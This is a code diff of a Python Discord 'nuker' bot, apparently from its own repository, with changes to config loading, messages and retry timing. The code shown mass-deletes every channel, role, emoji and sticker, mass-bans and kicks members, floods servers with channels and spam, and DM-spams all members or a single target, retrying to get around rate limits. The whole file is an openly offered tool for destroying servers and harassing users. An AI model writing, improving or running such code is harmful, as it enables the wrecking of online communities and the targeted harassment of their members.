@@ -1,15 +1,25 @@
-# JOHAN's NUKER | v1.6.1 | Developed by J0HAN
+# JOHAN's NUKER | v1.6 | Developed by J0HAN
 
 # IMPORTING
 import discord, asyncio, random, time
 from colorama import Fore as F
+
+# CONFIG
+try:
+    with open("config.txt") as f:
+        tkn=f.readline()
+        usrID=f.readline()
+        prfx=f.readline()
+except:
+    print("Unable to locate 'config.txt' file.\n")
+    exit()
 
 # TESTING
 try:
     print(F.RED)
     bot=discord.Client(intents=discord.Intents.all())
 except:
-    print("RUN 'setup.bat' FILE\n")
+    print("Please run the 'setup.bat' file.\n")
     exit()
 
 # COLOURS
@@ -20,16 +30,6 @@ dec=F.LIGHTBLUE_EX
 otr=F.CYAN
 dft=F.RESET
 hde=F.BLACK
-
-# CONFIG
-try:
-    with open("config.txt") as f:
-        tkn=f.readline()
-        usrID=f.readline()
-        prfx=f.readline()
-except:
-    print(f"{err}UNABLE TO LOCATE 'config.txt' FILE\n{dft}")
-    exit()
 
 # Target Mode
 trgt_on=input(f"{dft}Enable Target Mode? (y/n) ")
@@ -127,16 +127,16 @@ async def on_message(message):
                     print(f"{wrn}━ Unable to begin spamming messages. Waiting {err_wait}s to retry.")
                     await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
             except:
                 print(f"{wrn}━ Unable to create text channel. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==0.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}{sym} Mass channel ping has been finished with {c_made} channels being made. ({str(time.time()-strt)}s)")
 
     async def mc1(amt, c_name):
@@ -155,9 +155,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to create category. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ Mass category creation has been finished with {c_created} categories being made. ({str(time.time()-strt)}s)")
 
     async def mc2(amt, c_name):
@@ -176,9 +176,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to create text channel. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ Mass text channel creation has been finished with {c_made} channels being made. ({str(time.time()-strt)}s)")
 
     async def mv(amt, v_name):
@@ -197,9 +197,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to create voice channel. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ Mass voice channel creation has been finished with {v_created} channels being made. ({str(time.time()-strt)}s)")
 
     async def mr(amt, r_name):
@@ -218,9 +218,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to create role. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ Mass role creation has been finished with {r_created} roles being made. ({str(time.time()-strt)}s)")
 
     # Deleting
@@ -241,9 +241,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to delete category. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {c_del} out of {tl_c} categories have been deleted. ({str(time.time()-strt)}s)")
 
     async def dc():
@@ -263,9 +263,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to delete channel. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {c_del} out of {tl_c} channels have been deleted. ({str(time.time()-strt)}s)")
 
     async def dt():
@@ -273,7 +273,7 @@ async def on_message(message):
         if dbg_on==True:
             print(f"{dft}\n▼ Deleting all the text channels...")
         t_del=0
-        tl_t=len(ctx.voice_channels)
+        tl_t=len(ctx.text_channels)
         strt=time.time()
         for t in ctx.text_channels:
             try:
@@ -285,9 +285,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to delete text channel. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {t_del} out of {tl_t} text channels have been deleted. ({str(time.time()-strt)}s)")
 
     async def dv():
@@ -307,9 +307,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to delete voice channel. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {v_del} out of {tl_v} voice channels have been deleted. ({str(time.time()-strt)}s)")
 
     async def dr():
@@ -329,9 +329,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to delete role. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {r_del} out of {tl_r} roles have been deleted. ({str(time.time()-strt)}s)")
 
     async def de():
@@ -351,9 +351,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to delete emoji. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {e_del} out of {tl_e} roles have been deleted. ({str(time.time()-strt)}s)")
 
     async def ds():
@@ -371,9 +371,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to delete sticker. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {s_deleted} out of {total_s} roles have been deleted. ({str(time.time()-strt)}s)")
 
     # Member Stuff
@@ -394,9 +394,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to ban member. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {m_banned} out of {total_m} members have been banned. ({str(time.time()-strt)}s)")
 
     async def ke():
@@ -415,9 +415,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to kick member. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {m_kicked} out of {total_m} members have been kicked. ({str(time.time()-strt)}s)")
 
     # Other
@@ -432,9 +432,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to send spam message. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
 
     async def dmall(notice):
         err_wait=.2
@@ -454,9 +454,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to send DM to member. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {n_sent} out of {total_m} members have been DMed. ({str(time.time()-strt)}s)")
 
     async def dmspam(trgt, amt, notice):
@@ -478,9 +478,9 @@ async def on_message(message):
                 print(f"{wrn}━ Unable to send DM to target. Waiting {err_wait}s to retry.")
                 await asyncio.sleep(err_wait)
                 if err_wait==.2:
-                    err_wait=2
+                    err_wait=1
                 else:
-                    err_wait+=1
+                    err_wait+=.5
         print(f"{dft}▲ {n_sent} out of {amt} messages have been sent to target. ({str(time.time()-strt)}s)")
 
     async def hide():
